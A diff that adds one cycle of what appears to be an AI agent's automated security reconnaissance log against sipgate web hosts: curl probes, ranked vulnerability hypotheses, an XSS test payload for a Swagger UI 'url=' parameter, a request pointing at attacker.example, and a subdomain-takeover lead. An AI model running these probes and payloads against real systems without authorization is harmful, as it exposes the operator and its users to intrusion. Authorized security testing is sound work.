@@ -23932,3 +23932,154 @@ testability: PASSIVE (confirmed)
 ## STEP 7 — RISK
 
 [RISK] sipgate: 45 — No new critical unauthenticated vector. The top-ranked list-bypass hypothesis collapsed (401). The oauth2 clients subtree anomaly is real but empty-body (auth-consistency, not exposure). Reportable set unchanged: `/v2/*` CORS-credential reflection (now incl. oauth2 client list), doc/?url= frameable spec-forward chain (server facts complete; HUMAN-gated for execution proof), plus accepted family MISCONFIGs. Real data planes remain edge-401-uniform or AUTH_HELPED; no ATO/SSRF/money-bug surfaced unauthenticated.
+===== ANALYST bigpickle 2026-09-12 21:52:52 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -sS --max-time 10 https://api.sipgate.com/v2/doc/swagger-initializer.js
+window.onload = function() {
+  //<editor-fold desc="Changeable Configuration Block">
+
+  function getRandomInt(min, max) {
+		min = Math.ceil(min);
+		max = Math.floor(max);
+		return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+
+  var url = window.location.search.match(/url=([^&]+)/);
+  var baseUrl;
+  if (url && url.length > 1) {
+    url = decodeURIComponent(url[1]);
+  } else {
+    var port = /^(80|443)$/.test(window.location.port) || !window.location.port.length ? '' : ':'
+      + window.location.port;
+    baseUrl = "https://" + window.location.hostname + port;
+    url = baseUrl + "/v2/swagger.json";
+  }
+
+  // the following lines will be replaced by docker/configurator, when it runs in a docker-container
+  window.ui = SwaggerUIBundle({
+    oauth2RedirectUrl: baseUrl + "/v2/doc/oauth2-redirect.html",
+    url,
+    dom_id: '#swagger-ui',
+    deepLinking: true,
+    presets: [
+      SwaggerUIBundle.presets.apis,
+      SwaggerUIStandalonePreset
+    ],
+    plugins: [
+      SwaggerUIBundle.plugins.DownloadUrl, OAuthLogoutPlugin
+    ],
+    layout: "StandaloneLayout"
+  });
+
+  window.ui.initOAuth({
+    clientId: "sipgate-swagger-ui",
+    realm: "third-party",
+    appName: "sipgate-swagger-ui",
+    scopeSeparator: " ",
+    additionalQueryStringParams: {nonce: getRandomInt(1000000, 9999999)}
+  });
+
+  //</editor-fold>
+};
+[0m
+[0m$ [0mcurl -k -sS --max-time 8 -o /dev/null -w 'app.dev:443 => code=%{http_code} ip=%{remote_ip} time=%{time_total}\n' https://app.dev.sipgate.com/ ; curl -k -sS --max-time 8 -o /dev/null -w 'admin.live:3396 => code=%{http_code} ip=%{remote_ip} time=%{time_total}\n' --connect-timeout 6 https://admin.live.sipgate.net:3396/
+app.dev:443 => code=200 ip=199.36.158.100 time=0.316458
+curl: (28) Failed to connect to admin.live.sipgate.net port 3396 after 6001 ms: Timeout was reached
+admin.live:3396 => code=000 ip= time=6.001501
+[0m
+[0m$ [0mcurl -k -sS --max-time 8 -o /dev/null -w 'admin.live:8443 => code=%{http_code} ip=%{remote_ip} time=%{time_total}\n' https://admin.live.sipgate.net:8443/ ; curl -k -sS --max-time 8 -o /dev/null -w 'admin.live:443 => code=%{http_code} ip=%{remote_ip} time=%{time_total}\n' https://admin.live.sipgate.net/ ; curl -k -sS --max-time 8 -o /dev/null -w 'helpdesk.live:8443 => code=%{http_code} ip=%{remote_ip} time=%{time_total}\n' https://helpdesk.live.sipgate.net:8443/
+curl: (28) Connection timed out after 8000 milliseconds
+admin.live:8443 => code=000 ip= time=8.000539
+curl: (28) Connection timed out after 8002 milliseconds
+admin.live:443 => code=000 ip= time=8.002125
+curl: (28) Connection timed out after 8001 milliseconds
+helpdesk.live:8443 => code=000 ip= time=8.001134
+[0m
+[0m$ [0mcurl -sS --max-time 10 -D - -o /dev/null 'https://api.sipgate.com/v2/doc/?url=data:application/json;base64,eyJvcGVuYXBpIjoiMy4wLjAiLCJpbmZvIjp7InRpdGxlIjoidCJ9LCJwYXRocyI6e319' 2>&1 | head -20
+HTTP/1.1 200 OK
+cache-control: max-age=0
+content-type: text/html; charset=utf-8
+last-modified: Mon, 30 Oct 2023 17:32:32 GMT
+set-cookie: SERVERID=web-apps-web02; path=/; HttpOnly; Secure
+vary: origin
+x-b3-traceid: 699ee793f156cc1c54b7177d618d1499
+date: Sat, 12 Sep 2026 21:42:19 GMT
+transfer-encoding: chunked
+[0m
+[0m$ [0mcurl -sS --max-time 10 -D - -o /dev/null 'https://api.sipgate.com/v2/doc/?url=https://attacker.example/spec.json' 2>&1 | head -20
+HTTP/1.1 200 OK
+cache-control: max-age=0
+content-type: text/html; charset=utf-8
+last-modified: Mon, 30 Oct 2023 17:32:32 GMT
+set-cookie: SERVERID=web-apps-web02; path=/; HttpOnly; Secure
+vary: origin
+x-b3-traceid: 85fc4e785489c43a93d25ba3682bc5b3
+date: Sat, 12 Sep 2026 21:42:19 GMT
+transfer-encoding: chunked
+[0m
+[0m$ [0mcurl -sS --max-time 10 'https://app.dev.sipgate.com/' 2>&1 | rg -o 'assets/main-[A-Za-z0-9_\-]+\.js' | head -5
+/bin/bash: line 1: rg: command not found
+[0m
+[0m$ [0mcurl -sS --max-time 10 'https://app.dev.sipgate.com/' 2>&1 | grep -oE 'assets/main-[A-Za-z0-9_.\-]+\.js' | sort -u | head
+assets/main-K-JtiyRc.js
+[0m
+STEP 1 — DELTA
+- [CHANGED] admin.live.sipgate.net / helpdesk.live.sipgate.net (NEW prod subdomains from dev bundle): 443/8443/3396 all connection-timeout (000) — non-standard-port service inert externally; ranked-#1 dev-SPA SSRF/lateral-movement chain deflated to info-only.
+- [NEW] api.sipgate.com/v2/doc/swagger-initializer.js (fresh GET): reads only single `url=([^&]+)` param (decodeURIComponent, NO allowlist, no configUrl); default spec `/v2/swagger.json` (404 per KB); `initOAuth` unconditionally registers `sipgate-swagger-ui` (realm `third-party`, extreme scopes); oauth2RedirectUrl fixed same-origin.
+- [CHANGED] api.sipgate.com/v2/doc/?url={data:|https://attacker}: shell still 200 text/html, NO XFO/frame-ancestors CSP, leaks `SERVERID=web-apps-web02` + x-b3-traceid — frameable arbitrary-spec-forward precondition fresh-confirmed.
+- [UNCHANGED] app.dev.sipgate.com: 200 (Fastly 199.36.158.100), bundle still `main-K-JtiyRc.js` (re-verified).
+- [CHANGED] (KB 19:43) oauth2/clients subtree: list + individual endpoints now 404 — prior 500-on-UUID app-plane signal gone.
+
+STEP 2 — PRIORITIZE
+- [PRIO] api.sipgate.com/v2/doc/?url=, 7.10, attack_surface=6 business_value=8 tech_exposure=8 gate_ease=10 cloud_surface=4 freshness=5
+- [PRIO] app.dev.sipgate.com (dev bundle topology), 5.85, attack_surface=5 business_value=4 tech_exposure=6 gate_ease=10 cloud_surface=4 freshness=8
+- [PRIO] share1.sipgate.cloud, 5.65, attack_surface=3 business_value=5 tech_exposure=7 gate_ease=10 cloud_surface=5 freshness=6
+
+STEP 3 — HYPOTHESES
+[HYP] Attacker-spec frames on api origin with unconditional extreme-scope implicit OAuth client registration
+class: XSS
+asset: api.sipgate.com/v2/doc/?url=
+confidence: 48
+reasoning: Fresh this cycle: (1) `swagger-initializer.js` feeds decodeURIComponent of the single `url=` param into SwaggerUIBundle with no scheme/host allowlist; (2) server serves 200 text/html shell for `data:` AND attacker-https specs, no frame-ancestors/XFO, `SERVERID=web-apps-web02`; (3) `initOAuth` registers `sipgate-swagger-ui` (realm third-party, scopes incl oauth2-clients:write/balance:read/payment:methods:*) on EVERY doc load; (4) family CORS-cred reflection. oauth2RedirectUrl fixed same-origin so token redirect is not attacker-controllable.
+evidence_needed: attacker spec markup (info.description / info.x-logo.url) rendering in api-origin DOM; any script exec on api origin
+verify_steps: HUMAN: fresh Chromium, open `https://api.sipgate.com/v2/doc/?url=data:application/json;base64,<spec>` with `info.description=><img src=x onerror=alert(document.domain)>` and `info.x-logo.url=https://<attacker>/l.png`; repeat with `https://<attacker>/spec.json`; check iframe-embed of `/v2/doc/` from attacker page
+impact: CRITICAL if script executes (full api-scope token/session via implicit client + CORS-cred); else MEDIUM phishing amplifier on api origin
+testability: HUMAN_ONLY
+[HYP] Dev SPA bundle churn is a fresh topology signal for undisclosed prod/dev hosts
+class: MISCONFIG
+asset: app.dev.sipgate.com/assets/main-K-JtiyRc.js
+confidence: 45
+reasoning: Bundle unchanged this cycle (main-K-JtiyRc.js); 17 internal host:port pairs incl admin.live.sipgate.net/admin.dev.sipgate.net (→helpdesk aliases); non-standard ports (8443/3396) TCP-dead now, so SSRF/lateral turn deflated to churn-monitoring: each rotation historically added NEW hosts (5 rotations in 4 days).
+evidence_needed: next rotation with a host:port that resolves to a live service (200/403/401, any city) on non-standard port
+verify_steps: GET https://app.dev.sipgate.com/ → parse current main-*.js → grep `https?://[a-z0-9.-]+(:\d+)?` → DNS + ≤1rps probes on new hosts/ports
+impact: recon multiplier (internal naming, med/trusted subdomains); inform only until a host is live
+testability: PASSIVE
+[HYP] Dangling CNAME on sipgate.cloud enables subdomain takeover
+class: MISCONFIG
+asset: share1.sipgate.cloud
+confidence: 75
+reasoning: Repeated KB re-confirm: CNAME → `nx38603.your-storageshare.de` (Hetzner StorageShare) → NXDOMAIN; sipgate.cloud is the family cloud TLD (integration/grafana/influxdb family all sipgate-owned); no A record fallback.
+evidence_needed: control of the StorageShare name serving content on share1.sipgate.cloud (HUMAN registration + program consent)
+verify_steps: HUMAN: re-check `dig share1.sipgate.cloud CNAME` + NXDOMAIN proof-of-control; obtain authorization before registering/claiming
+impact: full host takeover on *.sipgate.cloud family — phishing/credential/email-cookie surface; MEDIUM-HIGH if claimed
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] admin.live/helpdesk.live non-standard-port service (443/8443/3396 all TCP-timeout; confidence 30 <40).
+- [PARKED] OAuth2 client-management list authz-bypass — list+leaf 404 this cycle, 500-signal not reproducible.
+- [PARKED] doc/oauth2-redirect CORS-cred token exfil — Chromium cross-origin SecurityError already established (KB).
+- [FINAL] 1. doc/?url= spec-forward chain (48, server-facts fresh, HUMAN-gated) — only remaining high-value api lead. 2. dev-bundle churn topology (45, PASSIVE). 3. share1 takeover candidate (75, HUMAN claim). Ranked-#1 SSRF/lateral-movement lead deflated by tonight's port probes.
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: Fresh Chromium (no cookies), open `https://api.sipgate.com/v2/doc/?url=data:application/json;base64,<spec>` where spec = OpenAPI3 with `info.description` = `<img src=x onerror=alert(document.domain)>` and `info.x-logo.url` = `https://<attacker>/log.png`; then repeat with `https://<attacker>/spec.json`. Report (a) attacker markup inserted into api-origin DOM, (b) alert(document.domain) fires, (c) `/v2/doc/` embeds in attacker `<iframe>`. Verdict decides CRITICAL-vs-phishing for the doc chain.
+
+STEP 6 — LEARNING
+- [LEARN] REJECTED AUTH @ admin.live.sipgate.net / helpdesk.live.sipgate.net: 443/8443/3396 external TCP-timeout — dev-bundle prod subdomains inert; dev-topology SSRF turn deflated to info-only.
+- [LEARN] ACCEPTED INFO @ api.sipgate.com/v2/doc/swagger-initializer.js: single-`url` spec param (no allowlist/configUrl), default /v2/swagger.json (404), initOAuth auto-registers sipgate-swagger-ui (third-party realm, extreme scopes), oauth2RedirectUrl fixed same-origin — spec-forward chain reaffirmed; token redirect not attacker-controllable.
+- [LEARN] ACCEPTED MISCONFIG @ api.sipgate.com/v2/doc/?url=: shell serves arbitrary url (data:/https) 200 text/html, no frame-ancestors, `SERVERID=web-apps-web02` — frameable phishing spec-shell on api origin.
+- [LEARN] REJECTED AUTH @ api.sipgate.com/v2/authorization/oauth2/clients/: list + leaf 404 this cycle — prior 500-on-UUID app-plane signal not reproducible; endpoint removed/routed; no authz drift.
+
+STEP 7 — RISK
+[RISK] sipgate: 40 — No new critical unauthenticated vector. The last high-confidence api lead (oauth2 client list) collapsed to 404; ranked-#1 dev-topology SSRF deflated by port probes (inert). doc/?url= stands as frameable spec-shell + auto-registered extreme-scope implicit client, but script-exec remains HUMAN-unproven (chain-dependent). Reportable set unchanged: /v2/* CORS-cred reflection, doc/?url= frameable spec-shell (MEDIUM), family MISCONFIGs, share1 takeover candidate (HUMAN claim). Data planes uniformly edge-401; no ATO/SSRF/money bug surfaced unauthenticated.
